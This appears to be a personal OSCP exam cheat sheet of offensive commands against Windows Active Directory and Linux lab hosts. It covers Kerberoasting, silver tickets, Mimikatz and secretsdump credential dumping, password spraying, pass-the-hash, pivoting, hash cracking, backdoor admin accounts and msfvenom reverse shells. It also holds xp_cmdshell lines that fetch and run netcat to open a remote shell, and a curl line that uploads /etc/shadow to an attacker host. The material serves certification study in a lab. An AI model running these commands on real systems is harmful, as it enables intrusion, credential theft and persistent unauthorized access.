# Check Logged on sessions (No need for admin)
# AS-REP Roasting
# Kerberoasting (all services are kerberoasable)

# Check access to SMB shares
# Find local admin rights
# 
# 
 
# Find interesting ACLs
# Find intresting ACEs 
# Resolve GUID if CN not resolved
```

### Kerberoasting

```jsx
sudo impacket-GetUserSPNs -request -dc-ip 10.10.137.146 oscp.exam/web_svc
```

```jsx
certutil -urlcache -split -f http://192.168.45.214/Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
type hashes.kerberoast
```

```jsx
sudo hashcat -m 13100 sql_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```jsx
netexec smb 192.168.204.187 -u svc_mssql -p trustno1
```

### AS-REP Roasting

```jsx
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

```jsx
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### ACLs

[Abusing Active Directory ACLs/ACEs | Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

***Generic All***

```jsx
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168.181.30 add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```

```jsx
net user jen Password123 /domain
```

**Generic All on Computer**: [**Resource Based Constrained Delegation Attack**](https://www.notion.so/Resource-Based-Constrained-Delegation-Attack-8003ef218a7e4cb2b7d0709521e85355?pvs=21) 

***ReadGMSAPassword***

```jsx
 wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
 certutil -split -urlcache -f http://192.168.45.171/GMSAPasswordReader.exe
.\GMSAPasswordReader.exe --AccountName svc_apache$
```

### GPOs

```jsx
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType
```

![Untitled](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f/Untitled.png)

[SharpGPOAbuse/SharpGPOAbuse-master at main · byronkg/SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

```jsx
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
gpupdate /force
# check if added to admin
net localgroup administrators
```

### Silver Ticket

```jsx
1. Get nthash -> https://codebeautify.org/ntlm-hash-generator // To translate cleartext to NTLM
2. Get domain-sid + domain -> (powershell) Get-ADdomain // DomainSID + Forest (fields)
3. Get spn -> (powershell) Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames //ServicePrincipalNames (field)

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
// Add to /etc/krb5user.conf -> one box below
// Add to /etc/hosts -> one box below
impacket-mssqlclient -k nagoya.nagoya-industries.com 
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell "certutil -URLCache -split -f http://192.168.45.171/payload/shell64.exe \Windows\Temp\shell64.exe"
xp_cmdshell "\Windows\Temp\shell64.exe"

```

```jsx
[libdefaults]
	default_realm = NAGOYA-INDUSTRIES.COM
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
	fcc-mit-ticketflags = true

[realms]	
	NAGOYA-INDUSTRIES.COM = {
		kdc = nagoya.nagoya-industries.com
	}

[domain_realm]
	.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

```jsx
240.0.0.1 nagoya.nagoya-industries.com
```

## Mimikatz

```jsx
certutil -urlcache -split -f http://192.168.45.241/mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

token::elevate
lsadump::sam
```

```jsx
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "lsadump::sam" "exit"
```

### impacket-secretsdump

Surely we can extract with secretsdump from ntds, system or sam that we grab. But more we can extract passwords remotely!

```jsx
impacket-secretsdump oscp/emmet@10.10.1.202
```

## Bloodhound

```jsx
certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
```

```jsx
netexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 192.168.181.30
netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.10.184.146
```

```jsx
sudo neo4j start
```

```jsx
bloodhound
```

```jsx
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

```jsx
MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
WHERE g.objectid ENDS WITH "-512" AND n<>g
RETURN p
```

## Netexec - Spray credentials

<aside>
💡 When all else fails - take a look at this cheat sheet SPIDER MODULE / ALL IN ONE!

</aside>

[https://github.com/seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

```jsx
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
```

```jsx
netexec smb 192.168.226.172 -u anirudh -p SecureHM --shares
```

```jsx
netexec smb 172.16.229.254 -u Administrator -H 'b2c03054c306ac8fc5f9d188710b0168' --local-auth
```

```jsx
netexec smb 172.16.229.0/24 -u joe -p 'Flowers1' --continue-on-success
```

```jsx
netexec rdp 172.16.191.0/24 -u yoshi -p 'Mushroom!' --continue-on-success
```

```jsx
netexec winrm 172.16.238.83 -u 'wario' -p 'Mushroom!'
```

```jsx
netexec wmi 172.16.238.83 -u 'wario' -p 'Mushroom!'
```

```jsx
netexec sql 10.10.137.148 -u sql_svc -p Dolphin1

impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```

```jsx
netexec ssh 10.10.137.148 -u sql_svc -p Dolphin1
```

```jsx
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```

## Impacket - Establish connections with credentials

```jsx
impacket-psexec administrator:']12FIYiy&Frtsz'@192.168.157.122
```

```jsx
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1f006e5b3ba84ddc6690f4bb2aa559c8 Administrator@192.168.157.122
```

```jsx
lput mimikatz.exe
lget mimikatz.log
```

```jsx
impacket-wmiexec jim:'Castello1!'@192.168.209.189
```

```jsx
evil-winrm -i 172.16.238.83 -u 'wario' -p 'Mushroom!'
```

```jsx
evil-winrm -i 172.16.134.7 -u 'relia.com\Administrator' -p 'vau!XCKjNQBv2$'
```

```jsx
upload <file>
download <file>
```

```jsx
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.219.122
```

```jsx
impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
```

[https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

## RDP

```jsx
xfreerdp /u:offsec /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
xfreerdp /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore
```

### TTY windows

[ConPtyShell/Invoke-ConPtyShell.ps1 at master · antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## Overpass-the-hash

```jsx
certutil -split -urlcache -f http://192.168.45.228/Rubeus.exe
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\Rubeus.exe asktgt /domain:access.offsec /user:svc_mssql /password:trustno1 /ptt
# view tickets
klist
# get cmd shell
certutil -split -urlcache -f http://192.168.45.214/PsExec.exe
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

## Powershell Remoting

```jsx
Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}

$DC01Session = New-PSSession -ComputerName 'DC01'
Enter-PSSession -Session $DC01Session
```

## DCOM

```jsx
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

# Port Forwarding

## SSH

```jsx
ssh -N -R 9998 kali@192.168.118.4
```

```jsx
sudo ss -ntplu
```

```jsx
sudo nano /etc/proxychains4.conf
tail /etc/proxychains4.conf
--last line--> socks5 127.0.0.1 9998
```

```jsx
proxychains nmap -sn 10.4.197.0/24
```

```jsx
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

## Ligolo

### Ligolo Setup

```jsx
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

```jsx
certutil -urlcache -split -f http://192.168.45.218/agent.exe /Windows/Temp/agent.exe
/Windows/Temp/agent.exe -connect 192.168.45.218:11601 -ignore-cert
```

```jsx
session
1
ifconfig
```

```jsx
sudo ip route add 172.16.229.0/24 dev ligolo
```

```jsx
session
1
start
```

```jsx
netexec smb 172.16.229.0/24
```

### Ligolo access to 127.0.0.1 on agent

```jsx
sudo ip route add 240.0.0.1/32 dev ligolo
```

### Ligolo Listener

```jsx
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

```jsx
listener_list
```

# Cracking

[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

[Hash Type Identifier - Identify unknown hashes](https://hashes.com/en/tools/hash_identifier)

### Hashcat

```jsx
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```jsx
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```jsx
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
```

```jsx
keepass2john Database.kdbx > keepass.hash
# nano keepass.hash (remove "Database:" from the beginning)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat -m 13400 password /usr/share/wordlists/fasttrack.txt --force
```

```jsx
hashcat -m 5600 web_svc.ntlm2 /usr/share/wordlists/rockyou.txt --force
```

### John

<aside>
💡 If john shows nothing to crack - and didn’t run even a second → worth a try to reset with

```jsx
rm ~/.john/john.*
```

</aside>

```jsx
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```jsx
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
if we see no password loaded -> john needs help identifying the hash
john mario-unshadowed --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
```

```jsx
zip2john sitebackup3.zip > zipjohn
john zipjohn --wordlist=/usr/share/wordlists/rockyou.txt

7z x sitebackup3.zip
```

```jsx
ssh2john id_rsa > ssh.hash
john ssh.hash -wordlist=/usr/share/wordlists/rockyou.txt
```

# Persistence

### Add admin on Windows

```jsx
net user /add [username] [password]
net localgroup administrators [username] /add
```

### Unlock RDP on Windows

```jsx
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```jsx
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

### Writable /etc/passwd → Root

We can write additional “root2” user, and get priv esc or access via ssh!

```jsx
openssl passwd 123
```

```jsx
root2:{HASH}:0:0:root:/root:/bin/bash
```

# File Transfers

## Download → From kali

```jsx
iwr -uri http://192.168.45.205/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://10.10.170.141:8080/winPEASx64.exe -UseBasicParsing -OutFile C:\Users\celia.almeda\Documents\winPEASx64.exe
```

```jsx
certutil -urlcache -split -f http://192.168.45.213/exploit.ps1 C:\Users\tony\exploit.ps1
```

```jsx
copy \\192.168.45.213\Share\exploit.ps1 .
```

```jsx
wget 192.168.45.194/payload/bash-shell -O /tmp/shell
```

```jsx
curl http://192.168.45.213/exploit.ps1 -o exploit.ps1
```

## Upload → To kali

### Upload via Apache2

```jsx
sudo systemctl restart apache2
```

```jsx
http://127.0.0.1/upload.html.
```

```jsx
curl --form "uploadedfile=@/etc/shadow" http://192.168.45.3/upload.php
```

```jsx
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.48.3/uploadWindows.php', '.\Secrets.jpg')
```

### Upload via SMB

```jsx
impacket-smbserver uploads . -smb2support  -username kali -password kali
```

```jsx
net use m: \\192.168.49.136\uploads /user:kali kali
```

```jsx
copy test.txt m:\
```

```jsx
ls m:\
```

# msfvenom

## exploit fix

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.203 LPORT=443 EXITFUNC=thread -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" --var-name shellcode
```

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

## exe/dll

```jsx
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f exe > shell.exe
```

```jsx
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f dll > shell.dll
```

### elf

```jsx
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=443 -f elf -o sh
```

### php

```jsx
msfvenom -p php/reverse_php -f raw lhost=192.168.45.210 lport=443 > pwn.php
```

## one line handler

```jsx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```

```jsx
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $(echo $IP); set LPORT 443; set ExitOnSession false; run -j"
```

# Stuck?

- Think simple!
- Go on break! Grab a snack 🙂
- Think simple!
- Something seems broken? (web\certutil\enumeration) = REVERT!!!!!
- **Think simple!**

## Initial access?

- Did you really look on the nmap output? check the service name\version\ports\HTTP titles for exploits.
- Did you try deafult credentials?
- Did you enumerate all web directories?
- Did you look on the weird ports with `nc -nv ip port`???
- Web enumeration! did you **RECURSIVLY** enumerate every directory??
- Can’t get reverse shell? try to use the same ports that are open on the machine (not only the basic 443 🙂)
- Did you check **SNMP**?

## Privilege escalation?

- Read linpeas/winpeas again - SLOWLY! (Do you see any passwords?)
- Enumerate manually
- Look for interesting files in /opt /Program Files
- Note every special file you see in the home directories.
- **GET STABLE SHELL!**
- Did you try to switch users / spray creds? (linux - get TTY to use ‘su’!!!)
- Try to run all exploits from suggested linpeas + all known exploits in linux section.
- Did you try to target other users/services? check if APACHE running and can write in it’s dir (can put there webshell)

[https://github.com/C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

## Active Directory?

- Did you really enumerate after you got Administrator on that machine?
- Did you spray all users with all password and all protocols? Did you try —local-auth (All Regular users\Administrator also)? + (—continue-on-success)
- Are you sure you need that priv-esc? maybe we can just pivot.
- If you have Admin == You have RDP (Just open it lol + backdoor account)

## Global

- Git
- Configuration files
- Powershell history \ transcripts
- Python script → did you try python2?
- Exploit not working? did you search another exploit version? did you search it on github? did you search the CVE?
- Found exploit but not much usage?? → DID YOU TRY READING THE COMMENTS IN THE EXPLOIT?????
- run STRINGS on binaries